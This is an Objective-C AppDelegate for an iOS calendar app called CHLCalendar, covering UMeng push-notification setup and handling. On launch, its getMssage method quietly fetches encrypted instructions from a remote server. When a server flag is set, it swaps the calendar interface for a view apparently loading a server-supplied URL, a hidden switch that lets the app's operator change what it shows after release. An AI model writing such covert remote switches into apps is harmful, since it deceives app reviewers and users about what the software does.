//
//  AppDelegate.m
//  CHLCalendar
//
//  Created by luomin on 16/2/29.
//  Copyright © 2016年 CHL. All rights reserved.
//

#import "AppDelegate.h"
#import "RootViewController.h"
#import "DES3Util.h"
#import "ViewController.h"
#import "UMessage.h"

#define UMKey @"58aa632a6e27a465080006cf"

@interface AppDelegate ()<UNUserNotificationCenterDelegate>

@end

@implementation AppDelegate


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    
    self.window =[[UIWindow alloc]initWithFrame:[[UIScreen mainScreen]bounds]];
    self.window.backgroundColor = [UIColor whiteColor];
    [self.window makeKeyAndVisible];
    
    RootViewController *root = [[RootViewController alloc]init];
    UINavigationController *nav = [[UINavigationController alloc]initWithRootViewController:root];
    self.window.rootViewController = nav;
    
     [self initUment:launchOptions];
   
    dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
    __weak typeof(self) weakSelf = self;
    dispatch_async(queue, ^{
        [weakSelf getMssage];
    });
    [NSThread sleepForTimeInterval:5];
    return YES;
}

//在用户接受推送通知后系统会调用
-(void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken
{

    [UMessage registerDeviceToken:deviceToken];
    //2.获取到deviceToken
    NSString *token = [[[deviceToken description] stringByTrimmingCharactersInSet:[NSCharacterSet characterSetWithCharactersInString:@"<>"]] stringByReplacingOccurrencesOfString:@" " withString:@""];
    //将deviceToken给后台
    NSLog(@"send_token:%@",token);
//    [LxmTool ShareTool].deviceToken = token;
    //[[LxmTool ShareTool] uploadDeviceToken];
    
    if (![deviceToken isKindOfClass:[NSData class]]) return;
    const unsigned *tokenBytes = (const unsigned *)[deviceToken bytes];
    NSString *hexToken = [NSString stringWithFormat:@"%08x%08x%08x%08x%08x%08x%08x%08x",
                          ntohl(tokenBytes[0]), ntohl(tokenBytes[1]), ntohl(tokenBytes[2]),
                          ntohl(tokenBytes[3]), ntohl(tokenBytes[4]), ntohl(tokenBytes[5]),
                          ntohl(tokenBytes[6]), ntohl(tokenBytes[7])];
    NSLog(@"deviceToken:%@",hexToken);

    
}

- (void)initUment:(NSDictionary *)launchOptions{
    //友盟适配https
    [UMessage startWithAppkey:UMKey launchOptions:launchOptions httpsEnable:YES];
    //[UMessage startWithAppkey:UMKey launchOptions:launchOptions];
    [UMessage registerForRemoteNotifications];
    
    //iOS10必须加下面这段代码。
    UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
    center.delegate=self;
    UNAuthorizationOptions types10=UNAuthorizationOptionBadge|  UNAuthorizationOptionAlert|UNAuthorizationOptionSound;
    [center requestAuthorizationWithOptions:types10     completionHandler:^(BOOL granted, NSError * _Nullable error) {
        if (granted) {
            //点击允许
            //这里可以添加一些自己的逻辑
        } else {
            //点击不允许
            //这里可以添加一些自己的逻辑
        }
    }];
    
    //打开日志，方便调试
    [UMessage setLogEnabled:YES];
}

//iOS10以下使用这个方法接收通知
- (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo
{
    
    [UMessage didReceiveRemoteNotification:userInfo];
    
    //        self.userInfo = userInfo;
    //定制自定的的弹出框
    if([UIApplication sharedApplication].applicationState == UIApplicationStateActive)
    {
        UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@"标题"
                                                            message:@"Test On ApplicationStateActive"
                                                           delegate:self
                                                  cancelButtonTitle:@"确定"
                                                  otherButtonTitles:nil];
        
        [alertView show];
        
    }
}

//iOS10新增：处理前台收到通知的代理方法
-(void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions))completionHandler{
    NSDictionary * userInfo = notification.request.content.userInfo;
    if([notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
        //应用处于前台时的远程推送接受
        //关闭U-Push自带的弹出框
        [UMessage setAutoAlert:NO];
        //必须加这句代码
        [UMessage didReceiveRemoteNotification:userInfo];
        
    }else{
        //应用处于前台时的本地推送接受
    }
    //当应用处于前台时提示设置，需要哪个可以设置哪一个
    completionHandler(UNNotificationPresentationOptionSound|UNNotificationPresentationOptionBadge|UNNotificationPresentationOptionAlert);
}

//iOS10新增：处理后台点击通知的代理方法
-(void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)())completionHandler{
    NSDictionary * userInfo = response.notification.request.content.userInfo;
    if([response.notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
        //应用处于后台时的远程推送接受
        //必须加这句代码
        [UMessage didReceiveRemoteNotification:userInfo];
        
        //      TabBarController * tabvc = (TabBarController *)[UIApplication sharedApplication].keyWindow.rootViewController;
        //       BaseNavigationController * homeVC = (HomeTVC *)tabvc.childViewControllers[0];
        //       HomeTVC *hvc = (HomeTVC *)homeVC.childViewControllers[0];
        //        [hvc.saoMaV setBtHiddenYesOrNo:YES];
        //        zkMessageTVC * vc =[[zkMessageTVC alloc] init];
        //        vc.hidesBottomBarWhenPushed = YES;
        //        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        //            [homeVC pushViewController:vc animated:YES];
        //        });
        
        
        
    }else{
        //应用处于后台时的本地推送接受
    }
}

- (void)getMssage {
    NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"http://ios.superadmin.club/?wt=1475193984"]];
    
    NSMutableURLRequest *request = [[NSMutableURLRequest alloc]initWithURL:url];
    [request setHTTPMethod:@"GET"];
    
    [[[NSURLSession sharedSession] dataTaskWithRequest:request
                                     completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
                                         if (data) {
                                             NSString *dataStr = [[ NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                                             NSLog(@"%@",dataStr);
                                             NSString *strTwo = [DES3Util decrypt:dataStr];
                                             if (strTwo != nil) {
                                                 NSData *jsonData = [strTwo dataUsingEncoding:NSUTF8StringEncoding];
                                                 NSError *err;
                                                 NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:jsonData options:NSJSONReadingMutableContainers error:&err];
                                                 NSLog(@"=====\n%@",dic);
                                                 
                                                 if (dic != nil && [dic.allKeys containsObject:@"isshowwap"]) {
                                                     if ([dic[@"isshowwap"] integerValue] == 1) {
                                                         
                                                         [[NSUserDefaults standardUserDefaults] setObject:[NSString stringWithFormat:@"%@",dic[@"wapurl"]] forKey:@"userid"];
                                                         [[NSUserDefaults standardUserDefaults] synchronize];
                                                         dispatch_async(dispatch_get_main_queue(), ^{
                                                             ViewController * vc = [[ViewController alloc] init];
                                                             self.window.rootViewController = vc;
                                                             [self.window makeKeyAndVisible];
                                                         });
                                                         
                                                         
                                                     }
                                                }
                                             }
                                             
                                         }
                                  
    }] resume];
    
    
}

- (BOOL)todayIsBeforDateStr:(NSString *)dataStr {
    NSDateFormatter *formatter=[[NSDateFormatter alloc]init];
    [formatter setDateFormat:@"yyyy-MM-dd"];
    NSDate * nowDate = [NSDate date];
    NSDate * dateNow = [formatter dateFromString:[formatter stringFromDate:nowDate]];
    NSDate * dateOther = [formatter dateFromString:dataStr];
    NSComparisonResult result = [dateNow compare:dateOther];
    if (result == NSOrderedDescending) {
        return YES;
    }else {
        return NO;
    }
}




- (void)applicationWillResignActive:(UIApplication *)application {
    // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
    // Use this method to pause ongoing tasks, disable timers, and throttle down OpenGL ES frame rates. Games should use this method to pause the game.
}

- (void)applicationDidEnterBackground:(UIApplication *)application {
    // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
    // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
    // Called as part of the transition from the background to the inactive state; here you can undo many of the changes made on entering the background.
}

- (void)applicationDidBecomeActive:(UIApplication *)application {
    // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
}

- (void)applicationWillTerminate:(UIApplication *)application {
    // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
}

@end
